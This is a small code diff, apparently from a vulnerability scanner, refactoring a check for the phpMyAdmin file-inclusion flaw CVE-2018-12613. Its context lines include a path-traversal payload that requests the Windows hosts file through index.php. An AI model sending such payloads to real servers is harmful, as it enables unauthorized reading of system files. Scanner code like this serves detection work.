@@ -9,12 +9,12 @@ cve_2018_12613_payloads = [
     {'path': 'index.php?target=db_sql.php%253f/../../../../../../../../C:\Windows\System32\drivers\etc\hosts'},
 ]
 
-def cve_2018_12613_scan(self, clients):
+def cve_2018_12613_scan(clients):
     ''' 该漏洞在 index.php, 导致文件包含漏洞 '''
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'phpMyadmin',
         'vul_type': 'FileInclude',
         'vul_id': 'CVE-2018-12613',
     }
